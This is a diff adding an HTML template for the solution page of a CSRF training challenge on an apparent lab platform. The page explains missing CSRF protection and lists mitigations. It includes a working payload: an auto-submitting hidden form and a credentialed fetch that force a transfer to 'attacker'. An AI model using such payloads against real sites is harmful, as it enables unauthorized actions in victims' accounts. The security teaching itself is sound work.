@@ -1,0 +1,91 @@
+{% extends 'base.html' %}
+
+{% block title %}CSRF Level 1 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">CSRF Level 1 Solution: Basic Form CSRF</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>This challenge demonstrates the most fundamental CSRF vulnerability where forms lack any protection mechanism.</p>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-primary text-white">
+                        <h5 class="mb-0"><i class="bi bi-bullseye me-2"></i>Attack Vector</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>The application accepts form submissions without validating the origin or implementing CSRF tokens. An attacker can create a malicious webpage that automatically submits forms to the vulnerable application when visited by an authenticated user.</p>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-warning text-white">
+                        <h5 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Needed</h5>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+
+                            <li>Web browser (Chrome, Firefox, etc.)</li>
+                            <li>Text editor for creating HTML forms</li>
+                            <li>Basic understanding of HTML forms</li>
+                            <li>Optional: Burp Suite for request analysis</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-success text-white">
+                        <h5 class="mb-0"><i class="bi bi-code-slash me-2"></i>Payload Example</h5>
+                    </div>
+                    <div class="card-body">
+                        <pre class="bg-dark text-light p-3 rounded"><code><!-- Malicious HTML page -->
+<html>
+<body onload="document.forms[0].submit()">
+    <form action="http://target.com/csrf/level1" method="POST">
+        <input type="hidden" name="recipient" value="attacker">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="memo" value="malicious transfer">
+    </form>
+</body>
+</html>
+
+<!-- Or using JavaScript -->
+<script>
+fetch('http://target.com/csrf/level1', {
+    method: 'POST',
+    body: 'recipient=attacker&amount=1000&memo=malicious',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    credentials: 'include'
+});
+</script></code></pre>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-danger text-white">
+                        <h5 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Implement CSRF tokens (synchronizer tokens), validate referrer headers, use SameSite cookie attributes, and implement proper session management. For modern applications, consider using double-submit cookies or encrypted token patterns.</p>
+                    </div>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/csrf/level1" class="btn btn-primary me-2">
+                        <i class="bi bi-arrow-left me-1"></i>Back to Challenge
+                    </a>
+                    <a href="/challenges" class="btn btn-secondary">
+                        <i class="bi bi-list me-1"></i>All Challenges
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
